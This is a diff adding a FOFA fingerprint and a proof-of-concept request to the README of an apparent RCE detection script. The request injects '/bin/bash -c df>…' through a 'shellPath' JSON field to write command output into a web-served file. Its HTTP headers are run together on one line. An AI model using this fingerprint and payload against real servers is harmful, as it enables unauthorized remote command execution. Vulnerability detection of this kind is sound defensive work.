@@ -25,6 +25,15 @@ Clone this repository and ensure you have requests installed:
     cd Python_RCE_DETECT_script
     pip install requests
 
+FOFA:
+
+    icon_hash="-1935899595"
+
+POC：
+
+    POST /evo-runs/v1.0/receive HTTP/1.1Host: Accept-Encoding: gzipConnection: keep-aliveContent-Length: 249Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36X-Subject-Headerflag: ADAPT
+    { "method": "agent.ossm.mapping.config", "info": { "configure": "abcd", "filePath": "haha", "paramMap": { "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt", "filePath": "abc" }, "requestIp": "" }}
+
 Usage
 Single Target Scan:
 
